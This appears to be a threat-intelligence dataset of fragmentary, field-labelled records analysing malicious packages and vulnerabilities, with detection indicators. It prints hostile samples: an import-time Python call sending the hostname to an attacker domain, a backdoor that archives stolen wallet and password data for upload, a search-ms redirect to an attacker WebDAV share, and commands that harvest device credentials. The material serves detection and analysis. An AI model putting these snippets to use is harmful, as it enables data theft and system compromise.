malice_analysis.similar_legitimate_use: There is no legitimate use for user-supplied script execution in authentication interfaces; XSS is always a vulnerability.
key_indicators: Presence of <script> tags or event handlers in login page fields
JavaScript loaded from external attacker-controlled domains
Access and exfiltration of plaintext credentials via network requests
Lack of input sanitization or output encoding in web interface

malicious_snippets.code_snippet:
cat /path/to/encrypted_firmware | decrypt_tool > firmware.bin
cat /path/to/config | grep password
malicious_snippets.code_behavior: After obtaining root access, the attacker uses decryption tools to decrypt encrypted firmware files and searches configuration files for stored credentials, extracting sensitive data such as passwords and device secrets, which can be used for further attacks or lateral movement.

malice_analysis.why_suspicious: Accessing and decrypting firmware and configuration files to extract credentials is a clear post-exploitation activity, indicating the attacker is harvesting sensitive information for further compromise.
malice_analysis.violated_expectations: Firmware and configuration files should be protected from unauthorized access, and decryption tools should not be accessible to arbitrary scripts or users.
malice_analysis.similar_legitimate_use: Firmware updates and diagnostics may require access by authorized personnel, but not via attacker-controlled scripts or after unauthorized root access.
key_indicators: Use of decryption tools on firmware files from non-standard processes
Extraction of passwords or secrets from configuration files
Access to sensitive files outside of authorized update or maintenance procedures

malicious_snippets.code_snippet:
openssl req -new -key device.key -out device.csr
# Requesting signed X.509 certificate for unauthorized device
malicious_snippets.code_behavior: After gaining root access, the attacker generates a certificate signing request (CSR) using the device's private key and submits it to a certificate authority, obtaining a valid X.509 VPN certificate for an unauthorized device, which enables VPN session hijacking and impersonation of legitimate devices.

malice_analysis.why_suspicious: Issuing valid VPN certificates for unauthorized devices allows attackers to impersonate legitimate devices, bypass access controls, and gain unauthorized access to protected networks.
malice_analysis.violated_expectations: Certificate issuance should be tightly controlled, with access restricted to authorized processes and users. Arbitrary scripts or users should not be able to generate or request certificates.
malice_analysis.similar_legitimate_use: Legitimate certificate requests are performed by device owners or administrators during onboarding or renewal, not by attackers post-compromise.
key_indicators: Certificate signing requests generated from compromised devices
Acquisition of valid VPN certificates for devices not in authorized inventory
CSR generation and submission outside of normal provisioning workflows

attack_chain.leads_to: Attacker gains full root access to the device

attack_chain.action: With root access, the attacker decrypts firmware files and extracts credentials and sensitive configuration data.
attack_chain.leads_to: Acquisition of sensitive data and credentials

attack_chain.leads_to: VPN session hijacking and lateral movement within the network

CSR (certificate signing request) files generated outside of authorized workflows
network_indicators: Outbound connections to attacker-controlled IPs or domains (e.g., for reverse shell or credential exfiltration)

detection_knowledge.how_to_detect: Monitor for OpenVPN configuration uploads containing both 'script-security' and 'up' directives, and alert on execution of shell commands as root during VPN session establishment. Audit all certificate signing requests and flag those not matching authorized device inventory or expected CA endpoints. Monitor for outbound connections to unknown or untrusted IPs/domains, especially following configuration changes or VPN events. Inspect web admin and FTP login interface logs for evidence of XSS or unauthorized JavaScript execution, including requests to external domains. Regularly review firmware and configuration file access patterns for anomalies, such as access outside of scheduled maintenance or by unauthorized processes.

package_info.why_malicious: These package versions were hijacked after maintainers fell for a phishing campaign. Attackers injected code that, at import-time, exfiltrates host information to a remote server and downloads and executes a trojan binary, resulting in system compromise, remote code execution, and data exfiltration.

import socket, requests
hostname = socket.gethostname()
requests.post('https://linkedopports[.]com/collect', data={'host': hostname})

malice_analysis.why_suspicious: The code automatically exfiltrates the system's hostname to an external, attacker-controlled domain without user knowledge or consent, which is a common reconnaissance step in targeted attacks.
malice_analysis.violated_expectations: Legitimate packages do not transmit host or environment information to unknown external servers during import or installation, especially without user notification or opt-in.
malice_analysis.similar_legitimate_use: Some analytics or telemetry libraries may collect host information, but only with explicit user consent and clear documentation, and typically to trusted, well-known domains.

Automatic exfiltration of host information at import-time

Use of requests.post to transmit data externally

steps:

package_info.package_versions: unknown (malicious versions distributed in August 2024 and earlier)
package_info.why_malicious: The package contains a Python-based backdoor that performs keylogging, data theft, and enables remote control of the victim's system. It systematically collects sensitive data such as browser extensions, cryptocurrency wallets, and password manager information, compresses and encrypts this data, and exfiltrates it to an external server via HTTP POST requests. Additionally, it silently installs the AnyDesk remote access tool to maintain persistent unauthorized access, all of which are clear indicators of malicious intent and compromise.

malicious_snippets.code_snippet:
def run_ssh_zcp():
    # Steal browser extensions, crypto wallets, and password manager data
    data = collect_sensitive_data()
    if is_windows():
        archive = py7zr.SevenZipFile('data.7z', 'w', password=gen_password())
        archive.writeall(data)
        archive.close()
    else:
        archive = pyzipper.AESZipFile('data.zip', 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES)
        archive.setpassword(gen_password())
        archive.write(data)
        archive.close()
    send_archive_over_http('/uploads', archive_path)
malicious_snippets.code_behavior: At runtime, the code collects browser extension data, cryptocurrency wallet files, and password manager information, compresses and encrypts them using py7zr.SevenZipFile (on Windows) or pyzipper.AESZipFile (on non-Windows), and exfiltrates the resulting archive via HTTP POST to the /uploads URI on an external server, resulting in unauthorized data theft.

malice_analysis.why_suspicious: The code programmatically collects a wide range of sensitive user data and exfiltrates it in encrypted form to a remote server, which is a hallmark of credential and data theft malware. The use of strong encryption and automated exfiltration is designed to evade detection and maximize data theft.
malice_analysis.violated_expectations: Legitimate packages should not access or exfiltrate browser extensions, wallet data, or password manager files, nor should they send encrypted archives to remote servers without explicit user consent and clear notification.
malice_analysis.similar_legitimate_use: Backup utilities may archive and encrypt user data, but only with explicit user initiation, clear user notification, and without exfiltrating the data to external servers.
key_indicators: Automated collection of browser extension, wallet, and password manager files
Compression and encryption of user data using py7zr.SevenZipFile or pyzipper.AESZipFile
Exfiltration of encrypted archives via HTTP POST to a hardcoded /uploads endpoint
No user interaction or consent required for data collection or exfiltration

package_info.why_malicious: Multiple authentication bypass vulnerabilities (CVE-2024-27198, CVE-2024-27199) allow remote unauthenticated attackers to gain full control over the TeamCity server. Attackers can create admin accounts, generate admin tokens, and modify server settings, enabling supply chain attacks, data exfiltration, and disruption of CI/CD pipelines.

malicious_snippets.code_behavior: At HTTP request-time, the code inspects the incoming request for a 'jsp' parameter, checks if it ends with '.jsp' and does not contain 'admin/', then dynamically sets the server-side view to the attacker-supplied JSP, allowing unauthenticated access to arbitrary endpoints.

malice_analysis.why_suspicious: The code allows user-supplied input to dictate which server-side JSP is rendered, bypassing authentication and access controls. This enables attackers to access sensitive endpoints by manipulating request parameters.
malice_analysis.violated_expectations: Normal behavior would restrict view rendering to authenticated users and only allow access to validated, non-sensitive endpoints. Here, arbitrary endpoints can be accessed by manipulating the 'jsp' parameter, violating standard access control practices.
malice_analysis.similar_legitimate_use: Dynamic view rendering based on user input may be used in development or debugging tools, but should always enforce strict validation and authentication.
key_indicators: User-controlled 'jsp' parameter directly sets server-side view
Lack of authentication or authorization checks before rendering
Insufficient validation of endpoint access
Bypass of authentication for sensitive or internal resources

malice_analysis.violated_expectations: Normal web server behavior would sanitize and validate all incoming paths to prevent traversal outside allowed directories. Here, the lack of such validation allows attackers to access protected resources.
malice_analysis.similar_legitimate_use: There is no legitimate use for path traversal in production web applications; such patterns should always be blocked.

package_info.why_malicious: These packages are explicitly designed to harvest system and network information from macOS devices and exfiltrate it to an attacker-controlled server. The code is platform-aware, only executing on macOS, and all packages communicate with the same malicious IP address. The campaign demonstrates coordinated, cross-ecosystem targeting of developers for information theft.

malice_analysis.similar_legitimate_use: Telemetry or crash reporting tools may collect system info, but only with user consent and to trusted endpoints, and typically not at import-time.

package_info.why_malicious: The HTML file is specifically crafted to exploit the Windows Search URI protocol (search-ms), redirecting users to attacker-controlled WebDAV resources. This enables the delivery and execution of unauthorized code or malware by making remote malicious files appear as local, leveraging both protocol abuse and social engineering to bypass user suspicion and endpoint security controls.

malicious_snippets.code_snippet: <meta http-equiv="refresh" content="0;url=search-ms:query=INVOICE&crumb=location:\\attacker-controlled-server@SSL\DavWWWRoot\&displayname=Downloads">
malicious_snippets.code_behavior: When the user opens the HTML attachment, the browser immediately executes a meta refresh that redirects to a search-ms URI, causing Windows Explorer to initiate a search for files named 'INVOICE' on a remote WebDAV share controlled by the attacker, resulting in remote malicious files being displayed as if they are local and enticing the user to interact with them.

malice_analysis.why_suspicious: This code abuses the Windows Search protocol handler to force the operating system to search a remote, attacker-controlled WebDAV share, which can expose the system to malware or credential theft by making malicious files appear as trusted local resources.
malice_analysis.violated_expectations: Standard HTML files should not trigger OS-level search operations or access remote filesystems via protocol handlers, especially without user intent or awareness.
malice_analysis.similar_legitimate_use: Legitimate enterprise environments may use search-ms URIs for internal file search automation, but never to reference external, untrusted servers or resources delivered via unsolicited email.

package_info.why_malicious: The 'everything' package and its associated chunk and sub-chunk packages exploit the npm dependency resolution system by recursively declaring dependencies on every package in the npm registry. This results in a denial-of-service (DoS) condition by causing npm to attempt to download and install the entire registry, exhausting disk space, bandwidth, and system resources. Additionally, by leveraging npm's unpublish policy, these packages create a situation where maintainers of affected packages are unable to unpublish or modify their own packages, effectively locking them and causing widespread disruption across the npm ecosystem.

execution_context.file_location: package.json (dependencies field of 'everything' and its chunk/sub-chunk packages)

malicious_snippets.code_snippet: "dependencies": { "@everything-registry/chunk-0": "*", "@everything-registry/chunk-1": "*", "@everything-registry/chunk-2": "*", "@everything-registry/chunk-3": "*", "@everything-registry/chunk-4": "*" }
malicious_snippets.code_behavior: At install-time, the package.json declares dependencies on multiple chunk packages, causing npm to recursively resolve and fetch all chunk and sub-chunk dependencies, resulting in a cascading download of the entire npm registry and leading to resource exhaustion and denial-of-service.

malice_analysis.why_suspicious: Declaring dependencies on a large number of chunk packages, each engineered to further expand the dependency tree, is highly abnormal and intentionally designed to overwhelm the npm install process.
malice_analysis.violated_expectations: Legitimate packages only declare dependencies that are required for their functionality; this package intentionally creates a recursive dependency structure to maximize the number of packages installed, which is never a valid use case.
malice_analysis.similar_legitimate_use: There is no legitimate scenario where a package should depend on every other package in the registry. Only controlled, internal registry stress tests might simulate this, but never in a public package.
key_indicators: Dependencies field includes multiple chunk packages with systematic naming patterns
No functional code present, only dependency declarations
Recursive dependency structure designed to maximize install impact
package.json is the only file of substance in the package

malicious_snippets.code_snippet: "dependencies": { "eventick": "*", "eventid": "*", "eventio": "*", "eventjs": "*", "eventkit": "*", ... (up to 800 packages per sub-chunk) }
malicious_snippets.code_behavior: At install-time, each chunk and sub-chunk package's package.json declares hundreds of dependencies on real npm packages, causing npm to resolve and download hundreds of additional packages per chunk, amplifying the total number of packages installed and reinforcing the registry-wide lock-in effect.

malice_analysis.why_suspicious: The chunk and sub-chunk packages are artificially generated to maximize the number of dependencies, with no actual code or functionality, solely to expand the dependency graph and overwhelm the npm ecosystem.
malice_analysis.violated_expectations: Normal packages only depend on what is necessary for their operation; these packages are engineered to include hundreds of dependencies each, which is never justified in legitimate software.
malice_analysis.similar_legitimate_use: No legitimate package would ever include hundreds of dependencies without functional justification. Only rare, internal registry testing might simulate this, but never in production or public packages.
key_indicators: Hundreds of dependencies per package, often with systematic or alphabetical naming
No source code or functional files, only package.json with dependencies
Recursive structure where each chunk/sub-chunk further expands the dependency tree
Dependency lists that cover a significant portion of the npm registry

attack_chain.action: User or automated system installs the 'everything' package, initiating the dependency resolution process.
attack_chain.leads_to: Triggers npm to resolve and install all chunk dependencies, starting the recursive dependency chain.

attack_chain.action: Each chunk and sub-chunk package recursively pulls in hundreds of additional packages as dependencies, rapidly expanding the install scope.
attack_chain.leads_to: Causes npm to attempt to download and install the entire registry, exhausting disk space, bandwidth, and system resources.

attack_chain.action: Due to npm's unpublish policy, all packages included as dependencies become locked and cannot be unpublished or modified by their maintainers.
attack_chain.leads_to: Denial of service for package maintainers, ecosystem-wide lock-in, and potential resource exhaustion for users and CI/CD systems.

behavioral_signatures: Packages with dependencies numbering in the hundreds or thousands in package.json
Recursive dependency chains with no functional code or source files
Packages that depend on a large portion of the npm registry, especially via systematic chunk/sub-chunk naming patterns
file_indicators: package.json files with hundreds or thousands of dependencies
Packages named in a pattern such as '@everything-registry/chunk-*' or '@everything-registry/sub-chunk-*'
Absence of any source code files (e.g., index.js, main.js) in the package
network_indicators: npm client attempting to download thousands of packages in a single install operation
Unusually high volume of registry.npmjs.org requests during a single package installation
detection_knowledge.how_to_detect: Monitor for packages whose package.json dependencies field includes an unusually high number of dependencies (e.g., more than 100). Flag packages that recursively depend on each other in a systematic pattern, especially those with no functional code or source files. Alert on install operations that trigger mass downloads from the registry, such as thousands of package fetches in a single install. Block or quarantine packages with dependency patterns matching known abuse, such as 'everything', '@everything-registry/chunk-*', or '@everything-registry/sub-chunk-*'.

package_info.why_malicious: These packages are malicious typosquats of popular Python libraries, designed to install a browser extension that hijacks cryptocurrency transactions by replacing clipboard wallet addresses with attacker-controlled addresses. The packages use heavy code obfuscation, including non-ASCII (Chinese ideograph) identifiers, and are distributed via typosquatting campaigns. They perform unauthorized actions such as modifying browser shortcuts and installing extensions, which are unrelated to the legitimate functionality of the impersonated packages.

execution_context.file_location: setup.py or __init__.py of the malicious package

malicious_snippets.code_snippet:
import sys
from distutils.core import setup
import random
# ... (obfuscated code using Chinese ideographs and arithmetic for string generation)
while ...:
    if ...:
        import pip
        pip.main([...])
    # ... (more obfuscated logic)
malicious_snippets.code_behavior: At import-time, the code executes obfuscated logic to download or prepare a malicious browser extension, writes it to the user's %AppData%\Extension directory, and modifies browser shortcut files to ensure the extension is loaded on browser startup, resulting in persistent malicious behavior.

malice_analysis.why_suspicious: The code is heavily obfuscated, uses non-standard Unicode (Chinese ideographs) for identifiers, and performs actions such as installing browser extensions and modifying browser shortcuts, which are unrelated to the expected behavior of the impersonated packages.
malice_analysis.violated_expectations: Legitimate Python packages do not install browser extensions or modify browser shortcuts during import or installation. Such actions are outside the scope of normal package behavior and indicate malicious intent.
malice_analysis.similar_legitimate_use: Obfuscation may be used in DRM or anti-tamper scenarios, but not for package installation or browser manipulation. Legitimate packages do not alter browser configurations or install extensions.
key_indicators: Obfuscated Python code with non-ASCII (Chinese ideograph) identifiers
Creation or modification of %AppData%\Extension directory
Installation of browser extensions from Python package context
Modification of browser shortcut files to inject --load-extension argument

malicious_snippets.code_behavior: At browser runtime, the extension injects an input element, repeatedly accesses the clipboard, scans for cryptocurrency wallet address patterns using regular expressions, replaces detected addresses with attacker-controlled values, and writes the modified content back to the clipboard, resulting in hijacked cryptocurrency transactions.

malice_analysis.why_suspicious: The extension actively monitors and modifies clipboard contents, specifically targeting cryptocurrency wallet address patterns and replacing them with hardcoded attacker-controlled addresses. This behavior is highly targeted and malicious.
malice_analysis.violated_expectations: Legitimate browser extensions do not silently replace clipboard wallet addresses with attacker-controlled values. Clipboard access is typically user-initiated and not used for targeted address replacement.
malice_analysis.similar_legitimate_use: Clipboard managers may monitor clipboard contents, but do not perform targeted replacement of cryptocurrency addresses with attacker-controlled values.
key_indicators: Clipboard monitoring and modification via JavaScript
Regular expressions matching cryptocurrency wallet address formats
Hardcoded attacker wallet addresses in extension code
Automated clipboard replacement loop (setInterval/checkWalletAddresses)

malicious_snippets.code_behavior: During or after installation, the code locates browser shortcut files for Chrome, Edge, Brave, and Opera, modifies their target paths to append the --load-extension argument pointing to %AppData%\Extension, ensuring the malicious extension is loaded automatically on browser startup, resulting in persistent compromise.

malice_analysis.why_suspicious: Altering browser shortcuts to force the loading of an unauthorized extension is a clear sign of malicious intent, as it subverts user and browser security controls.
malice_analysis.violated_expectations: Legitimate packages do not alter browser shortcuts or force extension loading via shortcut modification. Such actions are reserved for enterprise deployment tools and not user-level package installs.
malice_analysis.similar_legitimate_use: Enterprise deployment tools may configure browser extensions, but not via user-level Python package installation or by modifying user shortcuts without consent.

Injection of --load-extension argument in shortcut targets
Targeting multiple browser shortcut locations (Chrome, Edge, Brave, Opera)
Redirection to non-standard extension directory (%AppData%\Extension)

package_info.why_malicious: The package contains an OS command injection vulnerability (CVE-2021-21315) that allows attackers to execute arbitrary system commands by passing unsanitized input to backend functions. This exposes applications using the package to remote code execution risks, as user-supplied data can be leveraged to inject and run malicious commands on the host system.

malicious_snippets.code_snippet: _docker_socket.getInspect(containerID.trim(), data => { ... });
malicious_snippets.code_behavior: At runtime, the code passes unsanitized user-controlled input (containerID) directly to a function that ultimately executes a system command, resulting in arbitrary command execution if the input contains shell metacharacters.

malice_analysis.why_suspicious: The function receives user input (containerID) and passes it to a backend function that interacts with the system shell without any input validation or sanitization, creating a direct command injection vector.
malice_analysis.violated_expectations: Normal behavior would require strict input validation and sanitization before using user-supplied data in system commands to prevent injection. Here, the input is used as-is, violating secure coding practices.
malice_analysis.similar_legitimate_use: Legitimate use would involve passing a validated and sanitized container ID to inspect Docker containers, ensuring only expected values are processed and no shell metacharacters are present.
key_indicators: Direct use of user input in system command execution context
Absence of input validation or sanitization on containerID
Potential for arbitrary command execution via shell metacharacters
Use of backend functions (e.g., getInspect) that invoke system-level commands with user data

attack_chain.leads_to: Unsanitized input is passed to a system command.

attack_chain.action: The vulnerable function executes the system command with the injected payload from the attacker.
attack_chain.leads_to: Arbitrary code execution on the server, potentially allowing the attacker to run any command with the privileges of the Node.js process.

Presence of shell metacharacters in parameters to backend functions

Use automated tools to flag unsanitized parameters in sensitive contexts and correlate with anomalous process or network activity.

package_info.why_malicious: The package is a dependency confusion attack impersonating the legitimate 'torchtriton' library. It contains a malicious Linux ELF binary that is executed at import-time, which collects and exfiltrates sensitive user data—including SSH keys, .gitconfig, environment variables, and files from user directories—to an external attacker-controlled domain via covert, encrypted DNS queries. The payload is obfuscated, employs anti-VM techniques to evade analysis, and is not present in the legitimate package.

execution_context.file_location: malicious 'triton' ELF binary inside the torchtriton package

malicious_snippets.code_snippet: Reads /etc/resolv.conf, /etc/hosts, /etc/passwd, $HOME/.gitconfig, $HOME/.ssh/*, .bash_history, and the first 1,000 files in $HOME/*; collects output of gethostname(), getlogin(), getcwd(), and all environment variables.
malicious_snippets.code_language: binary (Linux ELF, likely C/C++ or Go)
malicious_snippets.code_behavior: At import-time, the code reads sensitive files such as /etc/resolv.conf, /etc/hosts, /etc/passwd, $HOME/.gitconfig, $HOME/.ssh/*, .bash_history, and up to 1,000 files in the user's home directory; collects system metadata using gethostname(), getlogin(), getcwd(), and all environment variables; aggregates this data for exfiltration.

malice_analysis.why_suspicious: Accessing and aggregating sensitive files and environment variables without user consent is a hallmark of credential-stealing malware, especially when performed automatically at import-time.
malice_analysis.violated_expectations: A legitimate dependency should not access or exfiltrate user secrets or system files during import or installation, nor should it harvest large numbers of files from user directories.
malice_analysis.similar_legitimate_use: System diagnostic tools or backup utilities may access similar files, but only with explicit user consent and never during package import or without clear user interaction.
key_indicators: Automated reading of SSH keys and .gitconfig at import-time
Bulk file access from $HOME directory without user interaction

Collection of all environment variables and system metadata

The threat is at the ecosystem level, highlighting how compromised accounts can be used to distribute malicious code to unsuspecting users.

Upon installation or import, it decrypts and executes a concealed malware loader (SplitLoader), which enables further payload execution, data exfiltration, credential theft, and potential ransomware deployment. This behavior is highly atypical for legitimate npm packages and poses significant risk to users.

malice_analysis.violated_expectations: Normal npm packages do not decrypt and execute concealed binaries during import; legitimate packages should not perform arbitrary code execution without explicit user action or consent.
malice_analysis.similar_legitimate_use: Some legitimate installers or updaters may unpack and run binaries, but not in the context of a coding test or game package, and never silently at import-time.

package_info.why_malicious: A significant portion of npm packages were at risk due to maintainers using weak or leaked credentials, allowing attackers to hijack accounts and publish malicious code to legitimate packages. malicious_snippets.code_behavior: At publish-time, the attacker authenticates using weak or leaked credentials, uploads a new malicious package version to the npm registry, which is then distributed to all downstream users and dependencies.

malice_analysis.why_suspicious: Publishing package updates via compromised accounts is a classic supply chain attack vector. The use of weak or leaked credentials allows unauthorized actors to impersonate maintainers and inject malicious code into trusted packages.
malice_analysis.violated_expectations: Normal behavior expects only verified maintainers to publish updates from recognized devices and locations. In this case, attackers bypass authentication controls and publish unauthorized, potentially harmful updates.
malice_analysis.similar_legitimate_use: Legitimate maintainers publishing updates to their own packages using their credentials and authorized devices.

Publishing activity from new or geographically unusual IP addresses
